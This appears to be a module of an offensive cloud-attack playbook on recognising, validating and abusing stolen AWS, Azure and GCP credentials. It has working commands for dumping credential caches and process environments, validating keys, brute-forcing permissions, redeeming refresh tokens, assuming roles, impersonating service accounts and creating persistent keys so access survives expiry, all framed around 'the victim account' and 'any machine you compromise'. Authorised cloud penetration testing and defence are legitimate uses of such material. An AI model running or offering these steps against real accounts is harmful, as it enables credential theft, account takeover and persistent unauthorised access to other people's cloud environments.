# Provider detail: recognition, validation, identity mapping

## AWS

### Recognition
- **Access key IDs** are prefixed by type: `AKIA` long-term user key, `ASIA`
  temporary STS key (needs session token), `AROA` role unique ID, `AIDA` user
  unique ID, `AGPA` group, `ANPA` managed policy. Only AKIA/ASIA are usable
  credentials; AROA/AIDA are identifiers useful for policy analysis.
- Secret access keys: 40 chars base64-ish `[A-Za-z0-9/+=]{40}`. Session tokens:
  several hundred chars base64, often starting `IQoJ` or `FwoG`.
- `~/.aws/credentials` sections: `aws_access_key_id`, `aws_secret_access_key`,
  `aws_session_token`. `~/.aws/config` can hold `role_arn` + `source_profile`
  (chained roles you can assume for free), `sso_start_url`/`sso_account_id`
  (check `~/.aws/sso/cache/*.json` for live SSO access tokens), and
  `credential_process` lines that reveal where creds come from.
- Also grep for: `AWS_ACCESS_KEY_ID` in env dumps/CI logs, EC2 metadata responses
  (`"AccessKeyId" : "ASIA...` with `Token`), ECS task creds, Lambda env vars.

### Account ID from the key itself
The account ID is encoded inside the access key ID, and
`aws sts get-access-key-info --access-key-id AKIA...` returns it — this call runs
under YOUR credentials and logs in YOUR CloudTrail, not the victim's. Use it to
decide whether a key is in-scope-interesting before ever touching the victim account.

### Validation / identity
```bash
export AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...   # token only for ASIA
aws sts get-caller-identity --output json
```
Read the ARN:
- `arn:aws:iam::123456789012:user/ci-deploy` — IAM user; look up its policies.
- `arn:aws:sts::123456789012:assumed-role/RoleName/session` — assumed role;
  `aws iam get-role --role-name RoleName` for its policies and trust.
- `arn:aws:sts::123456789012:federated-user/...` — GetFederationToken creds.

If `get-caller-identity` returns `InvalidClientTokenId` the key is dead/disabled;
`SignatureDoesNotMatch` means the secret is wrong (key ID may still be valid —
retry other candidate secrets).

### Self-enumeration (works with surprisingly weak perms)
```bash
aws iam get-user
aws iam list-attached-user-policies --user-name NAME
aws iam list-user-policies --user-name NAME && aws iam get-user-policy --user-name NAME --policy-name P
aws iam list-groups-for-user --user-name NAME
aws iam get-policy-version --policy-arn ARN --version-id v1   # read managed policy docs
aws iam get-account-authorization-details --output json       # EVERYTHING, if allowed
```

### Becoming other principals
```bash
aws iam list-roles --output json          # scan AssumeRolePolicyDocument of each
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Target --role-session-name x
```
Trust-policy patterns worth attacking:
- `"Principal": {"AWS": "arn:aws:iam::123456789012:root"}` — any principal in that
  account with `sts:AssumeRole` allow can take it.
- Cross-account trusts to an account you already own a principal in.
- `"Principal": {"AWS": "*"}` with no condition — anyone (also report as a finding).
- Service trusts (`ec2.amazonaws.com`, `lambda.amazonaws.com`) — reachable via
  iam:PassRole + launching that service (route to **cloud-privilege-escalation**).

Full graph: `pmapper graph create` then `pmapper query 'preset privesc *'` and
`pmapper visualize`. Exploitation: **pacu** (`run iam__enum_permissions`,
`run iam__privesc_scan`).

### Permission brute force (IAM read denied)
[enumerate-iam](https://github.com/andresriancho/enumerate-iam):
```bash
python3 enumerate_iam.py --access-key AKIA... --secret-key ... --session-token ...
```
Attempts ~1000 read-only calls across services; the successes ARE your effective
policy. Each success line (`-- iam.list_roles() worked!`) is a lead. Expect heavy
CloudTrail noise and many AccessDenied events.

## Azure

### Recognition
- **Service principal**: tuple of tenant ID (GUID), appId/client ID (GUID), and a
  client secret (`az ad sp create-for-rbac` output JSON keys: `appId`, `password`,
  `tenant`) or a PFX/PEM certificate. Secrets in CI often appear as
  `AZURE_CLIENT_ID`/`AZURE_CLIENT_SECRET`/`AZURE_TENANT_ID`.
- **JWTs**: three base64url segments starting `eyJ`. Decode payload:
  - `aud`: `https://management.azure.com/` → ARM token (resource plane),
    `https://graph.microsoft.com/` → Graph token (directory plane),
    `https://vault.azure.net` → Key Vault token. A token only works against its `aud`.
  - `tid` tenant, `oid` principal object ID, `upn`/`unique_name` user,
    `appid` the client app, `roles`/`wids` app roles & directory role template IDs,
    `scp` delegated scopes, `exp` expiry (epoch).
- **SAS**: `sig=` + `sv=` in a URL/query string. `sp=` lists permissions
  (r=read l=list w=write d=delete c=create a=add u=update); `se=` expiry;
  `sr=`/`srt=` scope (b blob, c container, s share; account SAS srt=sco).
  `ss=` services (b blob, f file, q queue, t table).
- **CLI caches**: `~/.azure/azureProfile.json` lists every subscription + tenant
  the CLI has seen (great recon even without live tokens);
  `~/.azure/msal_token_cache.json` holds refresh tokens (long-lived — redeem for
  new access tokens for ANY resource via the refresh-token grant);
  `service_principal_entries.json` holds SP secrets in cleartext.

### Validation / identity
```bash
az login --service-principal -u <appId> -p <secret> --tenant <tid>
az login --service-principal -u <appId> --certificate cert.pem --tenant <tid>
az account show --output json           # tenantId, subscription id/name, user.type
az account list --all --output json     # every visible subscription
az ad signed-in-user show               # user principals only (Graph)
az ad sp show --id <appId>              # the SP's own directory object
```
Raw bearer token (no az login needed):
```bash
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01"
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/me"
```
Redeem a refresh token for new access tokens (any resource, FOCI clients cross-redeem):
```bash
curl -s -X POST "https://login.microsoftonline.com/<tid>/oauth2/v2.0/token" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
  -d "grant_type=refresh_token&refresh_token=$RT" \
  -d "scope=https://graph.microsoft.com/.default"
```
(`04b07795-...` is the public Azure CLI client ID.)

### Role / assignment mapping
```bash
az role assignment list --assignee <oid-or-appId> --all --include-inherited -o json
az role definition list --custom-role-only -o json          # custom roles = privesc gold
az rest --method GET --url 'https://graph.microsoft.com/v1.0/me/memberOf'          # groups + directory roles
az rest --method GET --url 'https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq%20%27<appId>%27'
```
High-value RBAC: `Owner`, `User Access Administrator` (grant yourself anything),
`Contributor` (run commands on VMs, read automation), `Key Vault Administrator`.
High-value Entra roles: Global Administrator, Privileged Role Administrator,
Application Administrator (add secrets to any app → become its SPs). Route Entra
work to **azure-entra-id**.

When role listing is denied, probe: `az group list`, `az vm list`, `az keyvault
list`, `az storage account list`, `az ad user list --top 1` — each success implies
an assignment at some scope.

## GCP

### Recognition
- **Service-account key JSON**: `"type": "service_account"`, `project_id`,
  `private_key_id`, `private_key` (RSA PEM), `client_email`
  (`name@project.iam.gserviceaccount.com`). The `client_email` alone names a
  principal worth targeting for impersonation.
- **Access tokens**: `ya29.` prefix, ~1 hour validity. **Refresh tokens**: `1//`
  prefix (user OAuth) — redeemable indefinitely until revoked.
- `~/.config/gcloud/`: `credentials.db` + `access_tokens.db` (sqlite — tables hold
  refresh/access tokens per account; dump with `sqlite3 credentials.db
  'select * from credentials;'`), `application_default_credentials.json`
  (ADC: either `"type":"authorized_user"` with `refresh_token`, or an SA key),
  `configurations/config_default` (default project/account — recon).
- Also: GCE metadata token endpoint output, `GOOGLE_APPLICATION_CREDENTIALS` env.

### Validation / identity
```bash
gcloud auth activate-service-account --key-file=sa.json
gcloud auth list                       # ACTIVE account marked with *
gcloud config list                     # account + project context
gcloud projects list --format=json    # projects the identity can see
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=ya29...."   # email, scope, exp, aud
```
Use a raw token with gcloud: `gcloud projects list --access-token-file=tok.txt`,
or with curl: `-H "Authorization: Bearer ya29...."`.
Token scopes matter: `cloud-platform` = full API reach; narrow scopes
(`devstorage.read_only`) cap what the token can do regardless of IAM.

### IAM mapping and impersonation
```bash
gcloud projects get-iam-policy PROJECT_ID --format=json
gcloud organizations list && gcloud organizations get-iam-policy ORG_ID
gcloud iam service-accounts list --project PROJECT_ID
gcloud iam service-accounts get-iam-policy SA_EMAIL     # who can impersonate this SA
# Impersonation attempts (each success = new identity, re-enter the loop):
gcloud auth print-access-token --impersonate-service-account=SA_EMAIL
gcloud iam service-accounts keys create key.json --iam-account=SA_EMAIL   # persistent key
```
Privesc-relevant permissions: `iam.serviceAccounts.getAccessToken`,
`iam.serviceAccounts.signBlob`/`signJwt`, `iam.serviceAccounts.implicitDelegation`,
`iam.serviceAccountKeys.create`, `iam.serviceAccounts.actAs` (+ deploy compute/
functions as that SA), `resourcemanager.projects.setIamPolicy`.

### testIamPermissions brute force (get-iam-policy denied)
`testIamPermissions` never requires any permission itself — you can always ask:
```bash
TOKEN=$(gcloud auth print-access-token)
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:testIamPermissions" \
  -d '{"permissions":["storage.buckets.list","iam.serviceAccountKeys.create","compute.instances.setMetadata","resourcemanager.projects.setIamPolicy","iam.serviceAccounts.getAccessToken","cloudfunctions.functions.create"]}'
```
Batch up to 100 permissions per call; iterate over the full permission list
(gcp_enum / gcp-iam-brute style). The same method exists per-resource
(buckets, SAs, instances) — test at the resource level too.

## Cross-provider notes
- Any machine you compromise: run the classifier against `$HOME`, `/root`,
  `/etc`, CI workspace dirs, container env (`/proc/*/environ`), shell history.
- Metadata services are credential sources, not covered here — but their OUTPUT
  (ASIA keys, ya29 tokens, Azure IMDS JWTs) re-enters this skill.
- Timebox temporary creds: ASIA keys ≤ 12h, ya29 ≈ 1h, Azure access tokens ≈ 1h.
  Capture refresh material (role names, refresh tokens, SA emails, key files) so
  access survives expiry.
